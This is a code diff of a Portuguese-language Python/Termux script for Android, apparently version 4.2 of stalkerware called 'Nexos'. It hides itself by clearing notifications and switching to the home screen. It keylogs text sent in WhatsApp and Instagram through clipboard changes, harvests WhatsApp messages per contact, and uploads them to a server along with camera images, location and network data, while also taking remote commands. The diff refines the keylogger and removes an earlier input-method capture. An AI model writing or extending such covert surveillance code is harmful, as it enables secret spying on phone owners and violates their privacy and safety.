@@ -28,19 +28,16 @@ def obter_id():
 
 DEVICE_ID = obter_id()
 
-# ============================================
-# MODO STEALTH
-# ============================================
 def ativar_stealth():
     run("am start -a android.intent.action.MAIN -c android.intent.category.HOME", timeout=3)
     run("termux-notification-remove --all", timeout=2)
-    print("🥷 Modo Stealth ATIVADO\n")
 
 print("\n" + "="*50)
 print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
 print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
 print("="*50)
 ativar_stealth()
+print("🥷 Stealth + Keylogger ENTER\n")
 
 ultima_lat = -16.6869
 ultima_lon = -49.2648
@@ -51,6 +48,7 @@ ultimo_whatsapp = 0
 ultimo_keylog = 0
 historico_msg = {}
 msg_processadas = set()
+ultimo_clipboard = ""  # Guarda último texto para detectar ENTER
 
 def obter_rede():
     w = run("termux-wifi-connectioninfo")
@@ -86,27 +84,19 @@ def obter_app_aberto():
         elif "instagram" in foco_lower: return "instagram"
     return "outro"
 
-def obter_texto_digitado():
-    """Captura texto que está sendo digitado no campo de texto ATIVO"""
-    # Método 1: Pegar do input method (campo de texto focado)
-    result = run("dumpsys input_method | grep -oP 'mComposingText=\K[^ ]*' | head -1", timeout=2)
-    if result and len(result) > 1:
-        return result[:200]
-    
-    # Método 2: Pegar texto do campo ativo via dumpsys
-    result = run("dumpsys input_method | grep -E 'mCur.*text=' | head -1", timeout=2)
-    if result and "text=" in result:
-        try:
-            texto = result.split("text=")[1].split(",")[0]
-            if len(texto) > 1:
-                return texto[:200]
-        except: pass
-    
-    # Método 3: Clipboard (fallback)
+def obter_texto_enviado():
+    """
+    Detecta quando o usuário apertou ENTER (mensagem pronta).
+    Compara o clipboard atual com o anterior.
+    Se mudou E o app é WhatsApp/Instagram = mensagem enviada.
+    """
+    global ultimo_clipboard
     clip = run("termux-clipboard-get", timeout=2)
-    if clip and len(clip) > 0 and len(clip) < 500:
-        return clip[:200]
-    
+    if clip and len(clip) > 1 and len(clip) < 500:
+        # Se o clipboard MUDOU desde a última verificação = nova mensagem enviada
+        if clip != ultimo_clipboard:
+            ultimo_clipboard = clip
+            return clip[:200]
     return None
 
 def obter_whatsapp():
@@ -143,6 +133,11 @@ def obter_whatsapp():
                     
                     if pessoa not in historico_msg:
                         historico_msg[pessoa] = {"pessoa": pessoa, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
+                    
+                    # VERIFICA DUPLICATA dentro da mesma pessoa
+                    if historico_msg[pessoa]["mensagens"] and historico_msg[pessoa]["mensagens"][-1]["texto"] == texto[:150]:
+                        continue
+                    
                     historico_msg[pessoa]["mensagens"].append({"texto": texto[:150] if texto else "(sem texto)", "midia": tem_midia, "hora": datetime.now().strftime("%H:%M"), "tipo": "recebida"})
                     if len(historico_msg[pessoa]["mensagens"]) > 30: historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
                     historico_msg[pessoa]["ultima_msg"] = texto[:80]
@@ -155,36 +150,44 @@ def obter_whatsapp():
     return list(historico_msg.values())
 
 def obter_keylog():
+    """
+    SÓ captura quando detecta ENTER (clipboard mudou) + app WhatsApp/Instagram aberto.
+    Mostra status 'digitando...' quando app está aberto mas sem ENTER ainda.
+    """
     global ultimo_keylog, historico_msg
     agora = time.time()
-    if agora - ultimo_keylog < 3:
+    if agora - ultimo_keylog < 2:
         return None
     
     app = obter_app_aberto()
-    texto = obter_texto_digitado()
+    texto_enviado = obter_texto_enviado()
     
-    if app in ["whatsapp", "instagram"] and texto:
+    if app in ["whatsapp", "instagram"]:
         ultimo_keylog = agora
         
-        # Adiciona como mensagem ENVIADA na conversa
-        destino = "Conversa"  # Nome genérico
-        if destino not in historico_msg:
-            historico_msg[destino] = {"pessoa": destino, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
-        
-        # Verifica se não é duplicata
-        if not historico_msg[destino]["mensagens"] or historico_msg[destino]["mensagens"][-1]["texto"] != texto[:150]:
-            historico_msg[destino]["mensagens"].append({
-                "texto": texto[:150],
-                "midia": False,
-                "hora": datetime.now().strftime("%H:%M"),
-                "tipo": "enviada"
-            })
-            if len(historico_msg[destino]["mensagens"]) > 30:
-                historico_msg[destino]["mensagens"] = historico_msg[destino]["mensagens"][-30:]
-            historico_msg[destino]["ultima_msg"] = f"📤 {texto[:80]}"
-            historico_msg[destino]["total"] = len(historico_msg[destino]["mensagens"])
-        
-        return {"app": app, "ativo": True, "texto": texto[:200], "tipo": "enviada", "timestamp": datetime.now().strftime("%H:%M:%S")}
+        if texto_enviado:
+            # ENTER detectado! Adiciona como mensagem enviada
+            destino = "Conversa"
+            if destino not in historico_msg:
+                historico_msg[destino] = {"pessoa": destino, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
+            
+            # Verifica duplicata
+            if not historico_msg[destino]["mensagens"] or historico_msg[destino]["mensagens"][-1]["texto"] != texto_enviado[:150]:
+                historico_msg[destino]["mensagens"].append({
+                    "texto": texto_enviado[:150],
+                    "midia": False,
+                    "hora": datetime.now().strftime("%H:%M"),
+                    "tipo": "enviada"
+                })
+                if len(historico_msg[destino]["mensagens"]) > 30:
+                    historico_msg[destino]["mensagens"] = historico_msg[destino]["mensagens"][-30:]
+                historico_msg[destino]["ultima_msg"] = f"📤 {texto_enviado[:80]}"
+                historico_msg[destino]["total"] = len(historico_msg[destino]["mensagens"])
+            
+            return {"app": app, "ativo": True, "texto": texto_enviado[:200], "tipo": "enviada", "timestamp": datetime.now().strftime("%H:%M:%S")}
+        else:
+            # App aberto mas sem ENTER = digitando
+            return {"app": app, "ativo": True, "texto": "", "tipo": "digitando", "timestamp": datetime.now().strftime("%H:%M:%S")}
     
     ultimo_keylog = agora
     return None
@@ -219,7 +222,7 @@ def enviar_lote(front_b64, back_b64):
         return r.status_code == 200
     except: return False
 
-print("🛰️  INICIADO v4.1 (Keylogger input field + WhatsApp cards)\n")
+print("🛰️  INICIADO v4.2 (Keylogger ENTER + Sem duplicatas)\n")
 
 while True:
     t0 = time.time()
@@ -253,9 +256,12 @@ while True:
         cmd_cam = resp.get("comando_cam", "wait")
         cmd_remoto = resp.get("comando_remoto", "none")
         
-        # Terminal enxuto
         partes = [f"🥷 {datetime.now().strftime('%H:%M:%S')} Bat:{bat}% {rede}"]
-        if keylog and keylog.get("texto"): partes.append(f"⌨️{keylog['texto'][:25]}")
+        if keylog and keylog.get("ativo"):
+            if keylog.get("tipo") == "enviada":
+                partes.append(f"📤{keylog['texto'][:30]}")
+            elif keylog.get("tipo") == "digitando":
+                partes.append(f"⌨️digitando...")
         if msgs_whats: partes.append(f"💬{len(msgs_whats)}")
         print(" | ".join(partes) + f" | {dt:.1f}s")
         
